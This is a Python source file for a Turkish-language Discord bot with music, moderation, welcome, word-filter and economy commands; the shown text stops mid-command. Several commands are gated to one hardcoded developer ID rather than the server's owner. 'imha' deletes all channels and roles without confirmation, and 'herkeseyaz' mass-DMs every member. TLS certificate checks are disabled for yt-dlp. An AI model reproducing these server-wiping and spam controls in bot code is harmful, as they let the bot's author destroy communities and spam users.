import discord
from discord.ext import commands
import json
import os
import asyncio
import random
import yt_dlp
import requests
from datetime import datetime, timedelta

# ---- AYARLAR ----
TOKEN = "Discord botunuzun tokenini bura yaz"
OWNER_ID = 1185487219637637121  # Senin Discord ID'n
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

# ---- DOSYA YÖNETİMİ ----
if not os.path.exists("kullanicilar.json"):
    with open("kullanicilar.json", "w", encoding="utf-8") as f:
        json.dump({}, f)

if not os.path.exists("ekonomi.json"):
    with open("ekonomi.json", "w", encoding="utf-8") as f:
        json.dump({}, f)

if not os.path.exists("uyarilar.json"):
    with open("uyarilar.json", "w", encoding="utf-8") as f:
        json.dump({}, f)

if not os.path.exists("ayarlar.json"):
    with open("ayarlar.json", "w", encoding="utf-8") as f:
        json.dump({}, f)

# ---- YT-DLP AYARLARI ----
yt_dlp_options = {
    'format': 'bestaudio/best',
    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0',
}

ffmpeg_options = {
    'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
    'options': '-vn'
}

ytdl = yt_dlp.YoutubeDL(yt_dlp_options)

class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)
        self.data = data
        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
        
        if 'entries' in data:
            data = data['entries'][0]
            
        filename = data['url'] if stream else ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)

def kayit_ekle(user_id, guild_id):
    with open("kullanicilar.json", "r", encoding="utf-8") as f:
        data = json.load(f)
    if str(guild_id) not in data:
        data[str(guild_id)] = {}
    data[str(guild_id)][str(user_id)] = {"kayitli": True}
    with open("kullanicilar.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

def ekonomi_yukle():
    with open("ekonomi.json", "r", encoding="utf-8") as f:
        return json.load(f)

def ekonomi_kaydet(data):
    with open("ekonomi.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

def uyari_yukle():
    with open("uyarilar.json", "r", encoding="utf-8") as f:
        return json.load(f)

def uyari_kaydet(data):
    with open("uyarilar.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

def ayar_yukle():
    with open("ayarlar.json", "r", encoding="utf-8") as f:
        return json.load(f)

def ayar_kaydet(data):
    with open("ayarlar.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

# ---- MÜZİK SIRALARI ----
music_queues = {}

class MusicPlayer:
    def __init__(self, ctx):
        self.ctx = ctx
        self.queue = []
        self.current = None
        self.voice_client = None
        self.loop = False

# ---- AI YANITLARI ----
ai_responses = {
    "merhaba": ["Selam! Nasılsın?", "Merhaba! Size nasıl yardımcı olabilirim?", "Hey! Nasıl gidiyor?"],
    "nasılsın": ["İyiyim, teşekkürler! Sen nasılsın?", "Harika hissediyorum! Sen nasılsın?", "Bot olduğum için her zaman iyiyim! 😊"],
    "teşekkür": ["Rica ederim!", "Ne demek, her zaman!", "Bir şey değil! 😊"],
    "saat": [f"Şu an saat: {datetime.now().strftime('%H:%M:%S')}"],
    "tarih": [f"Bugün: {datetime.now().strftime('%d/%m/%Y')}"],
    "yardım": ["Yardım için `.yardım` yazabilirsin!"],
    "komutlar": ["Tüm komutları görmek için `.yardım` yazabilirsin!"],
    "bot": ["Evet, ben bir botum! Sahibim tarafından yapıldım. 🎵"],
    "müzik": ["Müzik çalmak için `.çal <şarkı adı>` yazabilirsin!"],
}

# ---- BOT EVENTS ----
@bot.event
async def on_ready():
    print(f"✅ Bot giriş yaptı: {bot.user}")
    await bot.change_presence(activity=discord.Game(name="Neler yok ki tarafından geliştiriliyor..."))

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    # AI Yanıt Sistemi - Bot etiketlendiğinde veya ismi geçtiğinde
    if bot.user.mentioned_in(message) or bot.user.name.lower() in message.content.lower():
        # Özel komutları işlemeden önce AI yanıtı ver
        for keyword, responses in ai_responses.items():
            if keyword in message.content.lower():
                response = random.choice(responses)
                await message.reply(response)
                break
        else:
            # Özel bir anahtar kelime yoksa genel yanıt ver
            general_responses = [
                "Evet, beni mi çağırdın?",
                "Buyrun, size nasıl yardımcı olabilirim?",
                "Merhaba! Bir şey mi istediniz?",
                "Yardım için .yardım yazabilirsiniz!",
                "Müzik çalmak ister misiniz? .çal <şarkı adı>"
            ]
            await message.reply(random.choice(general_responses))
    
    # Kelime filtresi
    ayarlar = ayar_yukle()
    guild_ayar = ayarlar.get(str(message.guild.id), {})
    filtre_kelimeler = guild_ayar.get("filtre_kelimeler", [])
    
    if filtre_kelimeler:
        for kelime in filtre_kelimeler:
            if kelime.lower() in message.content.lower():
                try:
                    await message.delete()
                    await message.channel.send(f"{message.author.mention} Mesajınız uygunsuz kelime içerdiği için silindi!", delete_after=5)
                except:
                    pass
                break
    
    await bot.process_commands(message)

@bot.event
async def on_member_join(member):
    ayarlar = ayar_yukle()
    guild_ayar = ayarlar.get(str(member.guild.id), {})
    
    # Otorol
    otorol_id = guild_ayar.get("otorol")
    if otorol_id:
        role = member.guild.get_role(int(otorol_id))
        if role:
            try:
                await member.add_roles(role)
            except:
                pass
    
    # Karşılama mesajı
    karsilama = guild_ayar.get("karsilama")
    if karsilama:
        kanal_id = karsilama.get("kanal")
        mesaj = karsilama.get("mesaj")
        if kanal_id and mesaj:
            kanal = member.guild.get_channel(int(kanal_id))
            if kanal:
                try:
                    mesaj = mesaj.replace("{user}", member.mention).replace("{server}", member.guild.name)
                    await kanal.send(mesaj)
                except:
                    pass

@bot.event
async def on_member_remove(member):
    ayarlar = ayar_yukle()
    guild_ayar = ayarlar.get(str(member.guild.id), {})
    
    # Ayrılma mesajı
    ayrilma = guild_ayar.get("ayrilma")
    if ayrilma:
        kanal_id = ayrilma.get("kanal")
        mesaj = ayrilma.get("mesaj")
        if kanal_id and mesaj:
            kanal = member.guild.get_channel(int(kanal_id))
            if kanal:
                try:
                    mesaj = mesaj.replace("{user}", str(member)).replace("{server}", member.guild.name)
                    await kanal.send(mesaj)
                except:
                    pass

# ---- BİLGİ KOMUTLARI ----
@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! `{round(bot.latency * 1000)}ms`")

@bot.command()
async def userinfo(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    embed = discord.Embed(title=f"👤 {member}", color=discord.Color.blue())
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    embed.add_field(name="ID", value=member.id)
    embed.add_field(name="Durum", value=str(member.status))
    embed.add_field(name="Katılma Tarihi", value=member.joined_at.strftime("%d/%m/%Y %H:%M:%S") if member.joined_at else "Bilinmiyor")
    embed.add_field(name="Hesap Oluşturma Tarihi", value=member.created_at.strftime("%d/%m/%Y %H:%M:%S"))
    embed.add_field(name="Roller", value=", ".join([r.name for r in member.roles if r.name != "@everyone"]) or "Yok", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def serverinfo(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=f"📌 {guild.name}", color=discord.Color.green())
    embed.add_field(name="Sunucu ID", value=guild.id)
    embed.add_field(name="Üye Sayısı", value=guild.member_count)
    embed.add_field(name="Kanal Sayısı", value=len(guild.channels))
    embed.add_field(name="Rol Sayısı", value=len(guild.roles))
    embed.add_field(name="Boost Seviyesi", value=guild.premium_tier)
    embed.add_field(name="Kurucu", value=str(guild.owner))
    embed.add_field(name="Oluşturulma Tarihi", value=guild.created_at.strftime("%d/%m/%Y %H:%M:%S"))
    await ctx.send(embed=embed)

# ---- MODERASYON (sen + adminler) ----
@bot.command()
async def ban(ctx, member: discord.Member, *, reason="Sebep belirtilmedi"):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.ban_members:
        await member.ban(reason=reason)
        await ctx.send(f"⛔ {member.name} banlandı. Sebep: {reason}")
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def unban(ctx, user_id: int):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.ban_members:
        try:
            user = await bot.fetch_user(user_id)
            await ctx.guild.unban(user)
            await ctx.send(f"✅ {user.name} unbanlandı.")
        except discord.NotFound:
            await ctx.send("❌ Bu kullanıcı bulunamadı.")
        except discord.HTTPException:
            await ctx.send("❌ Bu kullanıcı banlı değil.")
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def kick(ctx, member: discord.Member, *, reason="Sebep belirtilmedi"):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.kick_members:
        await member.kick(reason=reason)
        await ctx.send(f"🚪 {member.name} sunucudan atıldı. Sebep: {reason}")
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def mute(ctx, member: discord.Member, *, reason="Sebep belirtilmedi"):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.manage_roles:
        role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not role:
            role = await ctx.guild.create_role(name="Muted")
            for kanal in ctx.guild.channels:
                await kanal.set_permissions(role, send_messages=False, speak=False)
        await member.add_roles(role)
        await ctx.send(f"🔇 {member.name} mutelendi. Sebep: {reason}")
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def unmute(ctx, member: discord.Member):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.manage_roles:
        role = discord.utils.get(ctx.guild.roles, name="Muted")
        if role:
            await member.remove_roles(role)
            await ctx.send(f"🔊 {member.name} unmutelendi.")
        else:
            await ctx.send("⚠️ Mute rolü bulunamadı.")
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def slowmode(ctx, seconds: int):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.manage_channels:
        await ctx.channel.edit(slowmode_delay=seconds)
        await ctx.send(f"⏱️ Slowmode {seconds} saniye olarak ayarlandı.")
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def temizle(ctx, amount: int):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.manage_messages:
        deleted = await ctx.channel.purge(limit=amount)
        await ctx.send(f"🧹 {len(deleted)} mesaj silindi.", delete_after=5)
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def warn(ctx, member: discord.Member, *, reason="Sebep belirtilmedi"):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.kick_members:
        uyarilar = uyari_yukle()
        guild_id = str(ctx.guild.id)
        user_id = str(member.id)
        
        if guild_id not in uyarilar:
            uyarilar[guild_id] = {}
        if user_id not in uyarilar[guild_id]:
            uyarilar[guild_id][user_id] = []
        
        uyari = {
            "reason": reason,
            "moderator": str(ctx.author),
            "date": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        }
        uyarilar[guild_id][user_id].append(uyari)
        uyari_kaydet(uyarilar)
        
        uyari_sayisi = len(uyarilar[guild_id][user_id])
        
        embed = discord.Embed(
            title="⚠️ Kullanıcı Uyarıldı",
            description=f"{member.mention} kullanıcısı uyarıldı.",
            color=discord.Color.orange()
        )
        embed.add_field(name="Sebep", value=reason, inline=False)
        embed.add_field(name="Moderatör", value=ctx.author.mention, inline=True)
        embed.add_field(name="Toplam Uyarı", value=f"{uyari_sayisi}/3", inline=True)
        
        await ctx.send(embed=embed)
        
        # Kullanıcıya DM gönder
        try:
            await member.send(f"**{ctx.guild.name}** sunucusunda uyarı aldınız!\n**Sebep:** {reason}\n**Toplam Uyarı:** {uyari_sayisi}/3")
        except:
            pass
        
        # 3 uyarıda ban
        if uyari_sayisi >= 3:
            try:
                await member.ban(reason="3 uyarı aldığı için otomatik ban")
                await ctx.send(f"🔨 {member.name} 3 uyarı aldığı için otomatik olarak banlandı.")
            except:
                pass
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

@bot.command()
async def banlist(ctx):
    if ctx.author.id == OWNER_ID or ctx.author.guild_permissions.ban_members:
        try:
            bans = [entry async for entry in ctx.guild.bans(limit=50)]
            if not bans:
                return await ctx.send("📋 Bu sunucuda banlı kullanıcı yok.")
            
            embed = discord.Embed(title="📋 Ban Listesi", color=discord.Color.red())
            
            ban_listesi = ""
            for i, ban_entry in enumerate(bans[:20], 1):  # İlk 20'sini göster
                user = ban_entry.user
                reason = ban_entry.reason or "Sebep belirtilmedi"
                ban_listesi += f"`{i}.` **{user.name}#{user.discriminator}** (ID: {user.id})\n**Sebep:** {reason}\n\n"
            
            embed.description = ban_listesi
            embed.set_footer(text=f"Toplam {len(bans)} banlı kullanıcı • Sadece ilk 20'si gösteriliyor")
            
            await ctx.send(embed=embed)
        except Exception as e:
            await ctx.send("❌ Ban listesi alınırken hata oluştu.")
    else:
        await ctx.send("❌ Bu komutu kullanmaya yetkin yok.")

# ---- SUNUCU YÖNETİMİ (SADECE OWNER) ----
@bot.command()
async def imha(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    # Önce rolleri sil (@everyone ve bot rolleri hariç)
    for role in list(ctx.guild.roles):
        try:
            if role.name != "@everyone" and not role.is_bot_managed():
                await role.delete()
        except:
            pass
    
    # Sonra kanalları sil
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    try:
        new_channel = await ctx.guild.create_text_channel("genel")
        await new_channel.send("🗑️ Tüm kanallar ve roller silindi.")
    except:
        pass

@bot.command()
async def yedekal(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    yedek = {"channels": [], "categories": []}
    for kanal in ctx.guild.channels:
        yedek["channels"].append({"name": kanal.name, "type": str(kanal.type)})
    for cat in ctx.guild.categories:
        yedek["categories"].append({"name": cat.name})
    with open(f"{ctx.guild.id}_yedek.json", "w", encoding="utf-8") as f:
        json.dump(yedek, f, indent=4)
    await ctx.send(f"💾 {ctx.guild.name} yedeği alındı.")

@bot.command()
async def yedekver(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    try:
        with open(f"{ctx.guild.id}_yedek.json", "r", encoding="utf-8") as f:
            yedek = json.load(f)
        await ctx.send(f"✅ Yedek bulundu: {len(yedek['channels'])} kanal, {len(yedek['categories'])} kategori")
    except FileNotFoundError:
        return await ctx.send("⚠️ Önce bu sunucuda yedek alınmamış.")

# ---- TEMPLATE ALMA VE UYGULAMA (SADECE OWNER) ----
@bot.command()
async def templateal(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    template = {"roles": [], "categories": [], "channels": []}
    
    # Roller (@everyone hariç)
    for role in reversed(ctx.guild.roles):
        if role.name != "@everyone":
            template["roles"].append({
                "name": role.name,
                "permissions": role.permissions.value,
                "color": role.color.value,
                "hoist": role.hoist,
                "mentionable": role.mentionable,
                "position": role.position
            })
    
    # Kategoriler
    for category in ctx.guild.categories:
        cat_overwrites = []
        for target, perm in category.overwrites.items():
            overwrite_data = {
                "type": "role" if isinstance(target, discord.Role) else "member",
                "name": target.name,
                "allow": perm.pair()[0].value,
                "deny": perm.pair()[1].value
            }
            cat_overwrites.append(overwrite_data)
        
        template["categories"].append({
            "name": category.name,
            "position": category.position,
            "overwrites": cat_overwrites
        })
    
    # Kanallar
    for channel in ctx.guild.channels:
        if not isinstance(channel, discord.CategoryChannel):
            ch_overwrites = []
            for target, perm in channel.overwrites.items():
                overwrite_data = {
                    "type": "role" if isinstance(target, discord.Role) else "member",
                    "name": target.name,
                    "allow": perm.pair()[0].value,
                    "deny": perm.pair()[1].value
                }
                ch_overwrites.append(overwrite_data)
            
            ch_data = {
                "name": channel.name,
                "position": channel.position,
                "category": channel.category.name if channel.category else None,
                "overwrites": ch_overwrites
            }
            
            if isinstance(channel, discord.TextChannel):
                ch_data["type"] = "text"
                ch_data["topic"] = channel.topic
                ch_data["slowmode_delay"] = channel.slowmode_delay
                ch_data["nsfw"] = channel.nsfw
            elif isinstance(channel, discord.VoiceChannel):
                ch_data["type"] = "voice"
                ch_data["user_limit"] = channel.user_limit
                ch_data["bitrate"] = channel.bitrate
            elif isinstance(channel, discord.ForumChannel):
                ch_data["type"] = "forum"
                ch_data["topic"] = channel.topic
            elif isinstance(channel, discord.StageChannel):
                ch_data["type"] = "stage"
                ch_data["user_limit"] = channel.user_limit
                ch_data["bitrate"] = channel.bitrate
            
            template["channels"].append(ch_data)
    
    # Global template dosyasına kaydet
    with open("global_template.json", "w", encoding="utf-8") as f:
        json.dump(template, f, indent=4, ensure_ascii=False)
    
    embed = discord.Embed(
        title="💾 Template Başarıyla Alındı!",
        description=f"**{ctx.guild.name}** sunucusunun template'i kaydedildi.\n\n"
                   f"📊 **İstatistikler:**\n"
                   f"• **{len(template['roles'])}** rol\n"
                   f"• **{len(template['categories'])}** kategori\n"
                   f"• **{len(template['channels'])}** kanal",
        color=discord.Color.green()
    )
    embed.set_footer(text="Artık herhangi bir sunucuda .templatever komutuyla bu template'i uygulayabilirsin!")
    await ctx.send(embed=embed)

@bot.command()
async def templatever(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    try:
        with open("global_template.json", "r", encoding="utf-8") as f:
            template = json.load(f)
    except FileNotFoundError:
        return await ctx.send("⚠️ Henüz hiç template alınmamış. Önce bir sunucuda `.templateal` komutunu kullan.")
    
    embed = discord.Embed(
        title="⚠️ Template Uygulanacak!",
        description=f"Bu işlem **{ctx.guild.name}** sunucusundaki:\n"
                   f"• Tüm kanalları silecek\n"
                   f"• Tüm rolleri silecek\n"
                   f"• Template'deki yapıyı kuracak\n\n"
                   f"**Template İstatistikleri:**\n"
                   f"• **{len(template['roles'])}** rol oluşturulacak\n"
                   f"• **{len(template['categories'])}** kategori oluşturulacak\n"
                   f"• **{len(template['channels'])}** kanal oluşturulacak\n\n"
                   f"Devam etmek için **30 saniye** içinde `EVET` yazın.",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)
    
    def check(message):
        return message.author == ctx.author and message.content.upper() == "EVET"
    
    try:
        await bot.wait_for('message', check=check, timeout=30.0)
    except:
        return await ctx.send("❌ İşlem iptal edildi. (Zaman aşımı)")
    
    progress_msg = await ctx.send("🔄 Template uygulanıyor, lütfen bekleyin...")
    
    # 1. Kanalları sil
    for channel in list(ctx.guild.channels):
        try:
            if channel != ctx.channel:
                await channel.delete()
        except Exception as e:
            print(f"Kanal silme hatası: {e}")
    
    # 2. Rolleri sil (@everyone hariç)
    for role in list(ctx.guild.roles):
        try:
            if role.name != "@everyone" and not role.is_bot_managed():
                await role.delete()
        except Exception as e:
            print(f"Rol silme hatası: {e}")
    
    # 3. Rolleri oluştur
    created_roles = {"@everyone": ctx.guild.default_role}
    for role_data in reversed(template["roles"]):
        try:
            perms = discord.Permissions(role_data["permissions"])
            new_role = await ctx.guild.create_role(
                name=role_data["name"],
                permissions=perms,
                color=discord.Color(role_data["color"]),
                hoist=role_data["hoist"],
                mentionable=role_data["mentionable"]
            )
            created_roles[role_data["name"]] = new_role
        except Exception as e:
            print(f"Rol oluşturma hatası ({role_data['name']}): {e}")
    
    # 4. Kategoriler oluştur
    created_categories = {}
    for cat_data in template["categories"]:
        try:
            overwrites = {}
            for ow_data in cat_data["overwrites"]:
                target = None
                if ow_data["type"] == "role":
                    target = created_roles.get(ow_data["name"])
                else:
                    target = discord.utils.get(ctx.guild.members, name=ow_data["name"])
                
                if target:
                    allow = discord.Permissions(ow_data["allow"])
                    deny = discord.Permissions(ow_data["deny"])
                    overwrites[target] = discord.PermissionOverwrite.from_pair(allow, deny)
            
            new_category = await ctx.guild.create_category(
                cat_data["name"], 
                overwrites=overwrites
            )
            created_categories[cat_data["name"]] = new_category
        except Exception as e:
            print(f"Kategori oluşturma hatası ({cat_data['name']}): {e}")
    
    # 5. Kanalları oluştur
    first_text_channel = None
    for ch_data in template["channels"]:
        try:
            overwrites = {}
            for ow_data in ch_data["overwrites"]:
                target = None
                if ow_data["type"] == "role":
                    target = created_roles.get(ow_data["name"])
                else:
                    target = discord.utils.get(ctx.guild.members, name=ow_data["name"])
                
                if target:
                    allow = discord.Permissions(ow_data["allow"])
                    deny = discord.Permissions(ow_data["deny"])
                    overwrites[target] = discord.PermissionOverwrite.from_pair(allow, deny)
            
            category = created_categories.get(ch_data["category"]) if ch_data["category"] else None
            
            if ch_data["type"] == "text":
                channel = await ctx.guild.create_text_channel(
                    ch_data["name"],
                    overwrites=overwrites,
                    category=category,
                    topic=ch_data.get("topic"),
                    slowmode_delay=ch_data.get("slowmode_delay", 0),
                    nsfw=ch_data.get("nsfw", False)
                )
                if first_text_channel is None:
                    first_text_channel = channel
            elif ch_data["type"] == "voice":
                await ctx.guild.create_voice_channel(
                    ch_data["name"],
                    overwrites=overwrites,
                    category=category,
                    user_limit=ch_data.get("user_limit", 0),
                    bitrate=min(ch_data.get("bitrate", 64000), ctx.guild.bitrate_limit)
                )
            elif ch_data["type"] == "stage":
                await ctx.guild.create_stage_channel(
                    ch_data["name"],
                    overwrites=overwrites,
                    category=category,
                    user_limit=ch_data.get("user_limit", 0),
                    bitrate=min(ch_data.get("bitrate", 64000), ctx.guild.bitrate_limit)
                )
            elif ch_data["type"] == "forum":
                await ctx.guild.create_forum_channel(
                    ch_data["name"],
                    overwrites=overwrites,
                    category=category,
                    topic=ch_data.get("topic")
                )
        except Exception as e:
            print(f"Kanal oluşturma hatası ({ch_data['name']}): {e}")
    
    # 6. Mevcut kanalı sil
    try:
        await ctx.channel.delete()
    except:
        pass
    
    # 7. Başarı mesajını ilk text kanalına gönder
    if first_text_channel:
        try:
            embed = discord.Embed(
                title="✅ Template Başarıyla Uygulandı!",
                description=f"**{ctx.guild.name}** sunucusuna template başarıyla uygulandı!\n\n"
                           f"📊 **Oluşturulanlar:**\n"
                           f"• **{len(created_roles)-1}** rol oluşturuldu\n"
                           f"• **{len(created_categories)}** kategori oluşturuldu\n"
                           f"• **{len(template['channels'])}** kanal oluşturuldu",
                color=discord.Color.green()
            )
            embed.set_footer(text="Template sistemi başarıyla çalıştı! 🎉")
            await first_text_channel.send(embed=embed)
        except Exception as e:
            try:
                await first_text_channel.send("✅ Template başarıyla uygulandı!")
            except:
                print(f"Başarı mesajı gönderme hatası: {e}")

# ---- EKSTRA KOMUTLAR (SADECE OWNER) ----
@bot.command()
async def herkeseyaz(ctx, *, mesaj):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    başarılı = 0
    başarısız = 0
    for member in ctx.guild.members:
        if not member.bot and member != ctx.author:
            try:
                await member.send(mesaj)
                başarılı += 1
            except:
                başarısız += 1
    await ctx.send(f"📩 Herkese mesaj gönderildi. Başarılı: {başarılı}, Başarısız: {başarısız}")

@bot.command()
async def herkanalayaz(ctx, *, mesaj):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    başarılı = 0
    başarısız = 0
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(mesaj)
            başarılı += 1
        except:
            başarısız += 1
    await ctx.send(f"📢 Tüm kanallara mesaj gönderildi. Başarılı: {başarılı}, Başarısız: {başarısız}")

@bot.command()
async def herkesrolver(ctx, role: discord.Role):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    başarılı = 0
    başarısız = 0
    zaten_var = 0
    
    for member in ctx.guild.members:
        if not member.bot:
            try:
                if role not in member.roles:
                    await member.add_roles(role)
                    başarılı += 1
                else:
                    zaten_var += 1
            except:
                başarısız += 1
    
    embed = discord.Embed(
        title="👥 Toplu Rol Verme Tamamlandı!",
        description=f"**{role.name}** rolü tüm kullanıcılara verilmeye çalışıldı.",
        color=discord.Color.green()
    )
    embed.add_field(name="✅ Başarılı", value=başarılı, inline=True)
    embed.add_field(name="⚠️ Zaten Var", value=zaten_var, inline=True)
    embed.add_field(name="❌ Başarısız", value=başarısız, inline=True)
    
    await ctx.send(embed=embed)

# ---- OTOMASYON SİSTEMİ (SADECE OWNER) ----
@bot.command()
async def otorol(ctx, role: discord.Role = None):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    ayarlar = ayar_yukle()
    guild_id = str(ctx.guild.id)
    
    if guild_id not in ayarlar:
        ayarlar[guild_id] = {}
    
    if role:
        ayarlar[guild_id]["otorol"] = str(role.id)
        ayar_kaydet(ayarlar)
        await ctx.send(f"✅ Otorol {role.mention} olarak ayarlandı. Yeni gelenler otomatik bu rolü alacak.")
    else:
        if "otorol" in ayarlar[guild_id]:
            del ayarlar[guild_id]["otorol"]
            ayar_kaydet(ayarlar)
            await ctx.send("❌ Otorol kaldırıldı.")
        else:
            await ctx.send("⚠️ Otorol ayarlanmamış.")

@bot.command()
async def karşılama(ctx, kanal: discord.TextChannel = None, *, mesaj = None):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    ayarlar = ayar_yukle()
    guild_id = str(ctx.guild.id)
    
    if guild_id not in ayarlar:
        ayarlar[guild_id] = {}
    
    if kanal and mesaj:
        ayarlar[guild_id]["karsilama"] = {
            "kanal": str(kanal.id),
            "mesaj": mesaj
        }
        ayar_kaydet(ayarlar)
        await ctx.send(f"✅ Karşılama mesajı {kanal.mention} kanalında ayarlandı.\n**Mesaj:** {mesaj}")
    else:
        if "karsilama" in ayarlar[guild_id]:
            del ayarlar[guild_id]["karsilama"]
            ayar_kaydet(ayarlar)
            await ctx.send("❌ Karşılama mesajı kaldırıldı.")
        else:
            await ctx.send("⚠️ Kullanım: `.karşılama #kanal mesaj`\n**Değişkenler:** `{user}` = kullanıcıyı etiketler, `{server}` = sunucu adı")

@bot.command()
async def ayrılma(ctx, kanal: discord.TextChannel = None, *, mesaj = None):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    ayarlar = ayar_yukle()
    guild_id = str(ctx.guild.id)
    
    if guild_id not in ayarlar:
        ayarlar[guild_id] = {}
    
    if kanal and mesaj:
        ayarlar[guild_id]["ayrilma"] = {
            "kanal": str(kanal.id),
            "mesaj": mesaj
        }
        ayar_kaydet(ayarlar)
        await ctx.send(f"✅ Ayrılma mesajı {kanal.mention} kanalında ayarlandı.\n**Mesaj:** {mesaj}")
    else:
        if "ayrilma" in ayarlar[guild_id]:
            del ayarlar[guild_id]["ayrilma"]
            ayar_kaydet(ayarlar)
            await ctx.send("❌ Ayrılma mesajı kaldırıldı.")
        else:
            await ctx.send("⚠️ Kullanüm: `.ayrılma #kanal mesaj`\n**Değişkenler:** `{user}` = kullanıcı adı, `{server}` = sunucu adı")

@bot.command()
async def filtrekelime(ctx, *, kelimeler = None):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    
    ayarlar = ayar_yukle()
    guild_id = str(ctx.guild.id)
    
    if guild_id not in ayarlar:
        ayarlar[guild_id] = {}
    
    if kelimeler:
        if kelimeler.lower() == "temizle":
            ayarlar[guild_id]["filtre_kelimeler"] = []
            ayar_kaydet(ayarlar)
            return await ctx.send("🗑️ Tüm filtre kelimeleri temizlendi.")
        
        kelime_listesi = [kelime.strip() for kelime in kelimeler.split(",")]
        
        if "filtre_kelimeler" not in ayarlar[guild_id]:
            ayarlar[guild_id]["filtre_kelimeler"] = []
        
        for kelime in kelime_listesi:
            if kelime not in ayarlar[guild_id]["filtre_kelimeler"]:
                ayarlar[guild_id]["filtre_kelimeler"].append(kelime)
        
        ayar_kaydet(ayarlar)
        await ctx.send(f"✅ {len(kelime_listesi)} kelime filtreye eklendi.\n**Kelimeler:** {', '.join(kelime_listesi)}")
    else:
        mevcut_kelimeler = ayarlar.get(guild_id, {}).get("filtre_kelimeler", [])
        if mevcut_kelimeler:
            await ctx.send(f"📋 **Filtre Kelimeleri:** {', '.join(mevcut_kelimeler)}\n\n**Kullanım:**\n`.filtrekelime kelime1, kelime2, kelime3` - Kelime ekler\n`.filtrekelime temizle` - Tüm kelimeleri siler")
        else:
            await ctx.send("⚠️ **Kullanım:** `.filtrekelime kelime1, kelime2, kelime3`\n**Temizlemek için:** `.filtrekelime temizle`")

# ---- EKONOMİ SİSTEMİ ----
@bot.command()
async def para(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    
    ekonomi = ekonomi_yukle()
    guild_id = str(ctx.guild.id)
    user_id = str(member.id)
    
    if guild_id not in ekonomi:
        ekonomi[guild_id] = {}
    if user_id not in ekonomi[guild_id]:
        ekonomi[guild_id][user_id] = {"para": 0, "son_gunluk": None}
        ekonomi_kaydet(ekonomi)
    
    para_miktari = ekonomi[guild_id][user_id]["para"]
    
    embed = discord.Embed(
        title=f"💰 {member.display_name} - Para Durumu",
        description=f"**Bakiye:** {para_miktari:,} TL",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    await ctx.send(embed=embed)

@bot.command()
async def günlük(ctx):
